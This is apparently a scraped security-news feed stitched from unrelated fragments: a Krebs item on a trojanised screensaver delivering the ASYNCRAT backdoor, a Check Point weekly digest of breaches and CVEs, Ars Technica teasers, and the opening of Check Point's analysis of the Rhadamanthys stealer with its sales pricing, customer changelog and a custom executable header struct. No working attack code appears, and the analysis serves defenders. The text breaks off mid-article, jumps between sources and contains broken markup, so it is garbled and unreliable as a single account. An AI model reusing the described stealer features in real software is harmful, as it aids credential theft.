&lt;p&gt;The link in the message fetches a malicious trojan disguised as a Windows screensaver file (Virustotal&amp;#8217;s analysis on this malware is &lt;a href="https://www.virustotal.com/gui/file/9abe847b497e68919143d4da1bb34e565a7fa9991f51c8f6bb7e5911cee01a24" rel="noopener" target="_blank"&gt;here&lt;/a&gt;). Simply viewing the booby-trapped screensaver on a Windows PC is enough to cause the bundled trojan to launch in the background.&lt;/p&gt;
&lt;p&gt;Mandiant&amp;#8217;s &lt;strong&gt;Austin Larsen&lt;/strong&gt; said the trojan is a commercially available backdoor known as &lt;strong&gt;ASYNCRAT&lt;/strong&gt;, a .NET-based backdoor that communicates using a custom binary protocol over TCP, and can execute shell commands and download plugins to extend its features.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72292" style="width: 759px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/10/shmalware-vt.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-72292" height="427" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/shmalware-vt.png" width="749" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-72292"&gt;A scan of the malicious screensaver file at Virustotal.com shows it is detected as bad by nearly a dozen security and antivirus tools.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&amp;#8220;Downloaded plugins may be executed directly in memory or stored in the registry,&amp;#8221; Larsen wrote in an analysis shared via email. &amp;#8220;Capabilities added via plugins include screenshot capture, file transfer, keylogging, video capture, and cryptocurrency mining. ASYNCRAT also supports a plugin that targets credentials stored by Firefox and Chromium-based web browsers.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Malware-laced targeted emails are not out of character for certain members of the Scattered Lapsus$ Hunters, who have previously harassed and threatened security researchers and even law enforcement officials who are investigating and warning about the extent of their attacks.&lt;/p&gt;
&lt;p&gt;With so many big data breaches and ransom attacks now coming from cybercrime groups operating on the Com, law enforcement agencies on both sides of the pond are under increasing pressure to apprehend the criminal hackers involved. In late September, prosecutors in the U.K. charged two alleged Scattered Spider members aged 18 and 19 with &lt;a href="https://krebsonsecurity.com/2025/09/feds-tie-scattered-spider-duo-to-115m-in-ransoms/" rel="noopener" target="_blank"&gt;extorting at least $115 million in ransom payments&lt;/a&gt; from companies victimized by data theft.&lt;/p&gt;
&lt;p&gt;U.S. prosecutors heaped their own charges on the 19 year-old in that duo &amp;#8212; U.K. resident &lt;strong&gt;Thalha Jubair &lt;/strong&gt;&amp;#8212; who is alleged to have been involved in data ransom attacks against &lt;strong&gt;Marks &amp;amp; Spencer&lt;/strong&gt; and &lt;strong&gt;Harrods&lt;/strong&gt;, the British food retailer &lt;strong&gt;Co-op Group&lt;/strong&gt;, and the 2023 intrusions at &lt;strong&gt;MGM Resorts&lt;/strong&gt; and &lt;strong&gt;Caesars Entertainment&lt;/strong&gt;. Jubair also was allegedly a key member of LAPSUS$, a cybercrime group that broke into dozens of technology companies beginning in late 2021.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72294" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72294" height="218" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/beaumont-sh.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72294"&gt;A Mastodon post by Kevin Beaumont, lamenting the prevalence of major companies paying millions to extortionist teen hackers, refers derisively to Thalha Jubair as a part of an APT threat known as &amp;#8220;Advanced Persistent Teenagers.&amp;#8221;&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In August, convicted Scattered Spider member and 20-year-old Florida man &lt;strong&gt;Noah Michael Urban&lt;/strong&gt; was &lt;a href="https://krebsonsecurity.com/2025/08/sim-swapper-scattered-spider-hacker-gets-10-years/" rel="noopener" target="_blank"&gt;sentenced to 10 years in federal prison&lt;/a&gt; and ordered to pay roughly $13 million in restitution to victims.&lt;/p&gt;
&lt;p&gt;In April 2025, a 23-year-old Scottish man thought to be an early Scattered Spider member was &lt;a href="https://krebsonsecurity.com/2025/04/alleged-scattered-spider-member-extradited-to-u-s/" rel="noopener" target="_blank"&gt;extradited from Spain to the U.S.&lt;/a&gt;, where he is facing charges of wire fraud, conspiracy and identity theft.

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Red Hat has &lt;a href="https://www.bleepingcomputer.com/news/security/red-hat-confirms-security-incident-after-hackers-breach-gitlab-instance/"&gt;confirmed&lt;/a&gt; a cyber attack that resulted in unauthorized access to one of its GitLab instances. The attackers, Crimson Collective, claim to have stolen approximately 570GB of compressed data. The data includes 28,000 internal repositories, including around 800 Customer Engagement Reports containing sensitive infrastructure and authentication details for notable organizations across multiple sectors.&lt;/li&gt;
&lt;li&gt;Asahi Group Holdings has &lt;a href="https://www.securityweek.com/cyberattack-on-beer-giant-asahi-disrupts-production/"&gt;experienced&lt;/a&gt; a cyberattack that disrupted orders, shipments, and call center operations across all its subsidiaries in Japan. Also, factory production was suspended. No threat actor has claimed responsibility yet.&lt;/li&gt;
&lt;li&gt;WestJet, the second-largest airline in Canada, has &lt;a href="https://therecord.media/westjet-data-breach-disclosures"&gt;suffered&lt;/a&gt; a cyber attack that resulted in the theft of sensitive information belonging to 1.2 million people. The data includes names, addresses, travel documents, government IDs, and more. The attack was attributed to the Scattered Spider cybercrime group.&lt;/li&gt;
&lt;li&gt;The private messaging platform Discord has &lt;a href="https://discord.com/press-releases/update-on-security-incident-involving-third-party-customer-service"&gt;disclosed&lt;/a&gt; a data breach which reportedly stemmed from a compromise of a third-party provider’s Zendesk. The incident led to the theft of personal information from users who interacted with the app’s support and Trust and Safety teams. The attack is attributed to affiliated actors of the Scattered Lapsus$ Hunters group.&lt;/li&gt;
&lt;li&gt;Motility Software Solutions, an American provider of dealer management software, was &lt;a href="https://www.bleepingcomputer.com/news/security/data-breach-at-dealership-software-provider-impacts-766k-clients/"&gt;hit&lt;/a&gt; by a ransomware attack, leading to the theft and exposure of files containing sensitive personal data of approximately 766,000 individuals. Information such as full names, addresses, emails, phone numbers, dates of birth, Social Security numbers, and driver’s license numbers were compromised.&lt;/li&gt;
&lt;li&gt;U.K. retailer Harrods has &lt;a href="https://www.bleepingcomputer.com/news/security/harrods-suffers-new-data-breach-exposing-430-000-customer-records/"&gt;suffered&lt;/a&gt; a data breach that resulted in the exposure of 430,000 sensitive e-commerce customer records when hackers compromised a third-party supplier. The leaked data includes names and contact details, but does not contain passwords, payment information, or order histories.&lt;/li&gt;
&lt;li&gt;Shamir Medical Center in Israel has &lt;a href="https://thecyberexpress.com/cyberattack-on-shamir-medical-center/"&gt;experienced &lt;/a&gt;a cyberattack that resulted in the leak of hospital emails containing sensitive patient information. The attack resulted in 8 terabytes of internal data, patient records, and operational communications allegedly compromised. The Qilin ransomware group claimed responsibility for the attack, demanding a $700,000 ransom and threatening to release the stolen data if demands were not met.&lt;br /&gt;&lt;em&gt;&lt;span class="TextRun SCXW211210279 BCX8" lang="EN-US" xml:lang="EN-US"&gt;&lt;span class="NormalTextRun SCXW211210279 BCX8"&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat&lt;/span&gt;&lt;/span&gt; &lt;span class="TextRun SCXW211210279 BCX8" lang="EN-US" xml:lang="EN-US"&gt;&lt;span class="NormalTextRun SCXW211210279 BCX8"&gt;(&lt;/span&gt;&lt;span class="NormalTextRun SpellingErrorV2Themed SCXW211210279 BCX8"&gt;Ransomware.Wins.Qilin&lt;/span&gt;&lt;span class="NormalTextRun SCXW211210279 BCX8"&gt;.*)&lt;/span&gt;&lt;/span&gt;&lt;span class="EOP SCXW211210279 BCX8"&gt; &lt;/span&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Researchers have &lt;/span&gt;&lt;a href="https://thecyberexpress.com/vmware-vulnerability-cve-2025-41244/"&gt;&lt;span&gt;disclosed&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a new vulnerability in VMware Aria Operations, CVE-2025-41244. The local privilege escalation flaw has been actively exploited in the wild since October 2024 by Chinese state-sponsored actors and potentially other malware. Successful exploitation allows a local non-administrative user on a VM with VMware Tools managed by Aria Operations (with SDMP enabled) to escalate privileges to root.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;A critical privilege escalation vulnerability (CVE-2025-32463) has been &lt;/span&gt;&lt;a href="https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-linux-sudo-flaw-exploited-in-attacks/"&gt;&lt;span&gt;disclosed&lt;/span&gt;&lt;/a&gt;&lt;span&gt; in Linux sudo versions 1.9.14 through 1.9.17, enabling local attackers to execute arbitrary commands as root using the -R (&amp;#8211;chroot) option, even if they are not included in the sudoers file. The flaw affects the default sudo configuration and is being actively exploited in the wild with public PoC code available.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;A critical vulnerability, CVE-2025-10035, with a CVSS score of 10.0 has been &lt;/span&gt;&lt;a href="https://www.fortra.com/security/advisories/product-security/fi-2025-012?ref=labs.watchtowr.com"&gt;&lt;span&gt;identified&lt;/span&gt;&lt;/a&gt;&lt;span&gt; in Fortra’s GoAnywhere MFT, primarily affecting systems with an internet-exposed admin console. The flaw enables unauthorized third-party access and has reportedly been exploited in the wild since at least September 10, 2025, with thousands of file transfer systems potentially at risk. Successful exploitation could lead to significant data theft.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Check Point Research has &lt;/span&gt;&lt;a href="https://blog.checkpoint.com/research/the-rising-cyber-threat-to-manufacturing-a-call-to-action-for-executives/https:/blog.checkpoint.com/research/the-rising-cyber-threat-to-manufacturing-a-call-to-action-for-executives/"&gt;&lt;span&gt;published&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a Manufacturing Sector Security Report, which highlights a sharp escalation in cyber attacks targeting the manufacturing sector. An average of 1,585 weekly attacks per organization in 2025 marks a 30% increase year over year, with regions like Latin America and APAC most affected. The analysis notes ransomware as the predominant threat, causing significant financial losses and operational disruptions. The report also details how compromised supply chains and state-backed attackers are leading to widespread production halts, intellectual property theft, and cascading risks throughout interconnected manufacturing networks.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span&gt;Check Point Research have &lt;/span&gt;&lt;a href="https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/"&gt;&lt;span&gt;analyzed&lt;/span&gt;&lt;/a&gt;&lt;span&gt; significant updates in the Rhadamanthys malware stealer version 0.9.2, detailing its new custom executable formats (XS1_B/XS2_B), expanded configuration and evasion tactics, and changes to mutex and bot ID generation. The latest release introduces features like backward-incompatible format and string obfuscation, checks using machine-specific identifiers, PNG-based payload delivery, and enhanced module fetching and injection flexibility. Additional components such as browser fingerprinting scripts and a new Lua-based Ledger Live stealer module were also identified, indicating further expansion of Rhadamanthys’ capabilities.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Check Point Research has &lt;/span&gt;&lt;a href="https://blog.checkpoint.com/research/amazon-prime-day-2025-the-dark-side-of-deals/"&gt;&lt;span&gt;uncovered&lt;/span&gt;&lt;/a&gt;&lt;span&gt; a surge in Amazon Prime Day scams, showing how attackers continue to weaponize urgency and trust. As millions of consumers flock online for deals, attackers launch phishing scams, fake domains, and malicious emails designed to steal Amazon credentials and payment information. 1 in every 18 new Amazon-related domains in September were identified as malicious or suspicious.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/li&gt;

The system at risk screens purchases of DNA sequences to determine when someone’s ordering DNA that encodes a toxin or dangerous virus. But, the researchers argue, it has become increasingly vulnerable to missing a new threat: AI-designed toxins.&lt;/p&gt;
&lt;p&gt;How big of a threat is this? To understand, you have to know a bit more about both existing biosurveillance programs and the capabilities of AI-designed proteins.&lt;/p&gt;
&lt;h2&gt;Catching the bad ones&lt;/h2&gt;
&lt;p&gt;Biological threats come in a variety of forms. Some are pathogens, such as viruses and bacteria. Others are protein-based toxins, like the ricin that was &lt;a href="https://en.wikipedia.org/wiki/2003_ricin_letters"&gt;sent to the White House&lt;/a&gt; in 2003. Still others are chemical toxins that are produced through enzymatic reactions, like the molecules &lt;a href="https://en.wikipedia.org/wiki/Phycotoxin"&gt;associated with red tide&lt;/a&gt;. All of them get their start through the same fundamental biological process: DNA is transcribed into RNA, which is then used to make proteins.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/science/2025/10/do-ai-designed-proteins-create-a-biosecurity-vulnerability/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Google has said again and again since announcing the change that sideloading isn’t going anywhere, but it’s definitely not going to be as easy. The &lt;a href="https://android-developers.googleblog.com/2025/09/lets-talk-security-answering-your-top.html"&gt;new information&lt;/a&gt; confirms app installs will be more reliant on the cloud, and devs can expect new fees, but there will be an escape hatch for hobbyists.&lt;/p&gt;
&lt;p&gt;Confirming app verification status will be the job of a new system component called the Android Developer Verifier, which will be rolled out to devices in the next major release of Android 16. Google explains that phones must ensure each app has a package name and signing keys that have been registered with Google at the time of installation. This process may &lt;a href="https://arstechnica.com/gadgets/2025/09/f-droid-calls-for-regulators-to-stop-googles-crackdown-on-sideloading/"&gt;break the popular FOSS storefront F-Droid&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It would be impossible for your phone to carry a database of all verified apps, so this process may require Internet access. Google plans to have a local cache of the most common sideloaded apps on devices, but for anything else, an Internet connection is required. Google suggests alternative app stores will be able to use a pre-auth token to bypass network calls, but it’s still deciding how that will work.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/10/google-confirms-android-dev-verification-will-have-free-and-paid-tiers-no-public-list-of-devs/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;These types of vulnerabilities are frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/"&gt;Rhadamanthys 0.9.x &amp;#8211; walk through the updates&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt; hasherezade&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="highlights"&gt;Highlights&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Rhadamanthys is a popular, multi-modular stealer, released in 2022. Since then, it has been used in multiple campaigns by various actors. Most recently, it is being observed&amp;nbsp;&lt;a href="https://x.com/anyrun_app/status/1955260801968672841"&gt;in the ClickFix campaigns&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;The latest version, 0.9.2, comes with significant updates that may impact detection and enforce updates to tools used by researchers.&lt;/li&gt;



&lt;li&gt;Check Point Research (CPR) provides multiple scripts that can help defenders keep up with these changes: a converter for the new version of the custom executable format, a deobfuscator for strings, and an unpacker for the package that carries the modules.&lt;/li&gt;



&lt;li&gt;In this report we provide details of the latest changes and describe them in the context of the malware as a whole.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;Rhadamanthys is a complex, multi-modular malware sold on the underground market since September 2022. It was first advertised by the actor “kingcrete2022.” From the outset, its design showed the hallmarks of experienced developers, and analysis soon revealed that it drew heavily from an earlier project by the same authors, Hidden Bee [&lt;a href="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"&gt;1&lt;/a&gt;]. This strong foundation helped Rhadamanthys quickly gain traction: from a niche product, it grew into one of the dominant stealers in cybercrime campaigns and has even attracted interest from more advanced threat actors.&lt;/p&gt;



&lt;p&gt;Since its appearance, Check Point Research (CPR) has been closely tracking its development, noting constant updates and customization options. In previous publications, we explored the&amp;nbsp;&lt;a href="https://research.checkpoint.com/2023/rhadamanthys-the-everything-bagel-infostealer/"&gt;breadth of its features&lt;/a&gt;,&amp;nbsp;&lt;a href="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"&gt;internal design&lt;/a&gt;, and the execution flow of its components&amp;nbsp;&lt;a href="https://research.checkpoint.com/2023/rhadamanthys-v0-5-0-a-deep-dive-into-the-stealers-components"&gt;using v0.5 as an example&lt;/a&gt;. Much of that work remains relevant today, as the core architecture has stayed intact.&lt;/p&gt;



&lt;p&gt;However, with the release of v0.9.x, Rhadamanthys introduced changes that broke some of our previously published tools, including the custom format converter and string deobfuscator. This was a clear sign that the family had reached another milestone update, one significant enough to warrant a fresh analysis. In this blog, we present our findings on the latest release, v0.9.2.&lt;/p&gt;



&lt;p&gt;It is worth noting that the initial loader of Rhadamanthys comes in multiple variants: it can be a .NET executable or a native Windows executable (32- or 64-bit). The main target of our analysis is the execution chain started by the native version. Although the first stage varies, the later stages are identical for all loader types.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="website-makeover"&gt;Website makeover&lt;/h2&gt;



&lt;p&gt;Rhadamanthys was initially promoted through posts on cybercrime forums, but soon it became clear that the author had a more ambitious plan to connect with potential customers and build visibility. In parallel, they launched a Telegram support channel, a Tor website with detailed product descriptions, and offered communication via Tox. Most recently, the website underwent a complete makeover, presenting a polished and professional image. The operators now brand themselves as “RHAD security” and “Mythical Origin Labs.”&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31954" height="600" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId27-1024x600.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 – Attackers’ website, main view&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The new site showcases all of their products, including teasers for those still in development. Alongside Rhadamanthys &amp;#8211; their flagship stealer &amp;#8211; they also advertise&amp;nbsp;&lt;em&gt;Elysium Proxy Bot&lt;/em&gt;&amp;nbsp;and a&amp;nbsp;&lt;em&gt;Crypt Service&lt;/em&gt;. Version updates are also listed, though this section is not always up to date with actual releases.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 2 - The attackers’ website: overview of different products" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId30.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; The attackers’ website: overview of different products&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;As before, Rhadamanthys is offered in tiered packages: from $299 per month for a self-hosted version, to $499 per month with a rented server and additional benefits. A special Enterprise tier, with individually negotiated pricing, is also available.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 3 - The attackers’ website: pricing of Rhadamanthys" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId33.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; The attackers’ website: pricing of Rhadamanthys&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The combination of the branding, product portfolio, and pricing structure suggest that the authors treat Rhadamanthys as a long-term business venture rather than a side project.&lt;/p&gt;



&lt;p&gt;For defenders, this professionalization signals that Rhadamanthys with its growing customer base and an expanding ecosystem is likely here to stay, making it important to track not only its malware updates but also the business infrastructure that sustains it.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="announcements-0.9.x"&gt;Announcements: 0.9.x&lt;/h2&gt;



&lt;p&gt;The release of version 0.9 was announced in February 2025, followed by subsequent updates 0.9.1 and 0.9.2. The official website, however, still lists only 0.9.1 (released in May). Its changelog includes a long list of updates, reproduced below:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;v0.9.1 (2025-05-18)
- Redesigned database operation process, separated read and write operations. Ensures data write integrity
- User management permission levels, introduced new worker, traffic merchant, removed observer mode
- Optimized file packaging and CPU usage when exporting to directory. Significantly reduced log packaging export speed
- TOR removed random address generation, fixed address permanently effective
- Management login added 2FA OTP login verification
- Client and task plugins, introduced memory mutex throughout the process, suppressing multiple executions on the same machine sending duplicate data
- Client loading introduced tracking system, can interface with user's loading program. Program startup and data collection work will trigger WEBHOOK callback
- When generating client files, directly select tags from list, generated files named by build tags
- Support using multiple server lists for client building
- Support relay jump page, real server URL encrypted stored in jump page
- Build stub completely removed registry write operations, X64 version, added process injection switch, can choose self-process injection and new process injection
- Task execution conditions added HWID condition

- a Kepler wallet changed to Keplr
- API interface changes, added new API interfaces
- Get device fingerprint information, added browser fingerprint information collection
- Build stub redesigned, higher stability and reliability
- Added nonascii: true configuration, supporting non-ASCII character password filtering&lt;/pre&gt;



&lt;p&gt;Several entries stand out, including the introduction of a global mutex to suppress duplicate executions, expanded process injection options, and a redesigned build stub. These indicate modifications to the core modules.&lt;/p&gt;



&lt;p&gt;Version 0.9.2, released a few months later and already gaining traction, is not yet listed on the website.&lt;/p&gt;



&lt;p&gt;As always, such changelogs are written for customers and do not fully capture the points of greatest interest to researchers. However, they still provide useful hints about which areas of the stealer have changed. In the following sections, we present the results of our analysis and highlight the modifications we confirmed, together with several changes that were not documented in the public notes.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="lumma-like-message-box"&gt;Lumma-like message box&lt;/h2&gt;



&lt;p&gt;The first thing that stands out in the updated release (0.9.2) is the introduction of a new message box that appears at the start of the malware. We encounter it as soon as we unpack the initial executable.&lt;/p&gt;



&lt;p&gt;It’s a well-known fact is that most malware is distributed in a protective layer, meant to thwart static detection. The usual first step of analysis is to remove it and reach the core executable (it can be done automatically, i.e.&amp;nbsp;with the help of tools like PE-sieve/&lt;a href="https://github.com/hasherezade/hollows_hunter"&gt;HollowsHunter&lt;/a&gt;). Interestingly, after unpacking the latest Rhadamanthys (0.9.2), as we try to run the obtained executable, the warning message shows up, saying: “Do you want to run a malware? (Crypt build to disable this message)”.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 4 - Unpacked Rhadamanthys sample showing the message box (view
from x64dbg)" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId39.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; Unpacked Rhadamanthys sample showing the message box (view from x64dbg)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;This message box is familiar to anyone who has ever analyzed the famous Lumma stealer (more info:&amp;nbsp;&lt;a href="https://outpost24.com/blog/lummac2-anti-sandbox-technique-trigonometry-human-detecti"&gt;here&lt;/a&gt;&amp;nbsp;[5]).&lt;/p&gt;



&lt;p&gt;In the past, the Lumma stealer introduced a check aimed at preventing malware distributors from spreading the initial executable in its plain, unprotected form, which can be easily detected. It was also preventing unskilled distributors from getting their own machine infected. The malware checks the file from which it is deployed, and if it found familiar patterns at the defined offsets, it recognizes that it is running from the raw, unpacked sample. In such cases, instead of running malicious actions immediately, a pop-up is displayed, asking the user for permission to continue. An identical check is now performed by Rhadamanthys.&lt;/p&gt;



&lt;p&gt;At first glance, it may appear that both malware families share the same code, responsible for displaying the message. But upon closer inspection, we can see that completely different APIs are called along the way. In Lumma, opening and reading the file is implemented via raw syscalls, and the message box is executed via&amp;nbsp;&lt;code&gt;NtRaiseHardError&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In Rhadamanthys, raw syscalls aren’t used, and the same message box is displayed by&amp;nbsp;&lt;code&gt;MessageBoxW&lt;/code&gt;.&lt;/p&gt;

&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X – Tracing an unpacked Rhadamanthys with TinyTracer; tracelog

&lt;/div&gt;


&lt;p&gt;Both loaders are obfuscated, but the obfuscation patterns are different. In the case of the Rhadamanthys loader, the APIs used are static, but the code blocks that call them are disconnected &amp;#8211; this obfuscation pattern reminds of some LLVM-based obfuscators.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31960" height="356" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId49.png" width="602" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; Fragment of Rhadamanthys code, showing the code block responsible for reading the file, along with the obfuscation patterns used. The jump to the next code chunk happens via EAX, using a dynamically calculated address.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;In contrast, Lumma code is much more coherent and can be decompiled. The important functions are called via syscalls, using a single proxy function:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31961" height="576" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId52.png" width="669" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Fragment of Lumma code implementing the same functionality. There is no disconnect between the code blocks. Functions are called via wrapper, using raw syscalls.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Therefore, despite the surface-level similarity, it seems to be just a behavioral mimicry. We don’t have any proof of links between the Lumma development group and Rhadamanthys; however, it is possible that after&amp;nbsp;&lt;a href="https://www.europol.europa.eu/media-press/newsroom/news/europol-and-microsoft-disrupt-world%E2%80%99s-largest-infostealer-lumma"&gt;Europol’s operation earlier this year&lt;/a&gt;, some members of the original Lumma team joined the promising competitor.&lt;/p&gt;



&lt;p&gt;This message box occurs in the Stage 1 executable. Typically for Rhadamanthys, this executable runs a shellcode in memory, which loads Stage 2, that consist of multiple modules. Its core modules are implemented in a format proprietary to this malware that we denote as XS.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="updates-in-the-custom-xs-format"&gt;Updates in the custom XS format&lt;/h2&gt;



&lt;p&gt;Since its inception, Rhadamanthys has shipped its executable modules in custom formats rather than the standard PEs. Only the first stage (the initial component), is a typical Windows executable. Its role is to prepare and deploy the set of components, that are unpacked from the internal package.&lt;/p&gt;



&lt;p&gt;Custom formats preserve all the essential components of an executable, such as relocations, import tables, and sections with access rights &amp;#8211; but this information is stored in headers fully reinvented by the authors. Unlike PE or ELF files, which are natively supported by the operating systems, custom executables require proprietary loaders. This acts as a form of obfuscation, as standard tools can’t parse them. In addition, the absence of expected headers makes it more difficult to dump those components from memory, and reconstruct them.&lt;/p&gt;



&lt;p&gt;The evolution of the custom formats used by Rhadamanthys was described in detail in our earlier work&amp;nbsp;&lt;a href="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"&gt;&lt;em&gt;From Hidden Bee to Rhadamanthys&lt;/em&gt;&lt;/a&gt;, along with a tool to convert them into PE for easier study (&lt;a href="https://github.com/hasherezade/hidden_bee_tools/releases"&gt;available here&lt;/a&gt;). Since version 0.5, Rhadamanthys modules used formats starting with the magic value&amp;nbsp;&lt;code&gt;XS&lt;/code&gt;. Two subtypes exist, used at different stages of execution (details outlined&amp;nbsp;&lt;a href="https://speakerdeck.com/hshrzd/rhadamanthys-and-the-40-thieves-the-nuts-bolts-and-lineage-of-a-multimodular-stealer?slide=36"&gt;here&lt;/a&gt;):&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;XS1&lt;/strong&gt;: modules from the Stage 2 package, embedded in the initial executable.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;XS2&lt;/strong&gt;: modules from the Stage 3 package, downloaded from C2 after environment checks.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In v0.9.x, both formats received updates, which we label&amp;nbsp;&lt;strong&gt;XS1_B&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;XS2_B&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The first subtype (XS1) contains an extended header, with a field denoting the version number. The current variant is version 4, a direct increment over the&amp;nbsp;&lt;a href="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"&gt;previously described one&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;The header of the XS1_B can be described by the following structure:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;#pragma pack(push, 1) // Adjust to one byte
        typedef struct {
            WORD magic;
            WORD nt_magic;
            WORD sections_count;
            **//WORD imp_key; &amp;lt;- removed**
            WORD hdr_size;
            BYTE ver;
            **BYTE imp_key; // &amp;lt;- added here**
            DWORD module_size;
            DWORD entry_point;
            t_XS_data_dir data_dir[XS_DATA_DIR_COUNT];
            t_XS_section sections;
        } t_XS_format_B;
#pragma pack(pop) // Back to the previous settings&lt;/pre&gt;



